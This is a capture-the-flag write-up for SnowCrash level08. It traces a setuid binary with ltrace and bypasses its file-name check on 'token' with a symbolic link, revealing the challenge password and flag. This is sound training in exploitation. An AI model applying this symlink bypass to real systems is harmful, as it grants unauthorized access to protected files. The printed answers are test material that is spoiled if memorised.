## level08

have 2 files in home. an exec and a token file.

when I run the exec it outputs:
> ./level08 [file to read]

so I try 
> ./level08 token
outputs:
>You may not access 'token'

I check the rights with ls -la and see token has rights only for user flag08. 

I run an ltrace on the exec and see the following:

	level08@SnowCrash:~$ ltrace ./level08
	__libc_start_main(0x8048554, 1, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
	printf("%s [file to read]\n", "./level08"./level08 [file to read]
	)                    = 25
	exit(1 <unfinished ...>
	+++ exited (status 1) +++

It's output is what I expected from running the exec not much else. I then try ltrace with the token as argument:

	level08@SnowCrash:~$ ltrace ./level08 token
	__libc_start_main(0x8048554, 2, 0xbffff7a4, 0x80486b0, 0x8048720 <unfinished ...>
	strstr("token", "token")                                      = "token"
	printf("You may not access '%s'\n", "token"You may not access 'token'
	)                  = 27
	exit(1 <unfinished ...>
	+++ exited (status 1) +++

So it's checking if the argument contains the string "token" and if it does it prints "You may not access 'token'".
Since I don't have rights to `token` I can't copy or modify so I make a symbolic link

	level08@SnowCrash:~$ ln -s token tok
	level08@SnowCrash:~$ ls
	level08  tok  token
	level08@SnowCrash:~$ ./level08 tok
	quif5eloekouj29ke0vouxean
	level08@SnowCrash:~$ su flag08
	Password:
	Don't forget to launch getflag !
	flag08@SnowCrash:~$ getflag
	Check flag.Here is your token : `25749xKZ8L7DkSCwJkT9dyv6f`
